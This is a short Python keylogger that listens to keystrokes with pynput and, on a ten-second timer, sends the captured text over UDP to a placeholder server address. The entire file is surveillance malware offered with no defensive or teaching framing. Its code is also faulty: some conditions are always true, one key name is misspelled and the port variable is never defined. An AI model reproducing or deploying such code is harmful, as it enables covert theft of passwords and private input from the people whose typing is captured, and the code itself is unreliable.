import pynput.keyboard
import threading, socket

logs = ""
def save_keys(key):
    global logs
    logs_tem = ""
    try: 
        logs_tem = str(key.char)
    except AttributeError:
        if key == key.space:
            logs = logs + " "
        elif key ==  key.tab or key.alt or key.down or key.enter:
            pass
        elif key == key.up or key.right or key.left or key.backspace:
            pass
        elif key == key.shft or key.caps_lock or key.ctrl: 
            pass
        else:
            logs_tem = " " + str(key) + " "
    logs = logs + logs_tem

def send_logs(logs):
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    n = 'Client'
    m = '{}> {}'.format(n,logs)
    s.sendto(m.encode(),('Server_IP',port))

def logs_report():
    global logs
    #print(logs)
    send_logs(logs)
    logs = ""
    threading_timer = threading.Timer(10, logs_report)
    threading_timer.start()

keys = pynput.keyboard.Listener(on_press=save_keys)
with keys:
    logs_report()
    keys.join()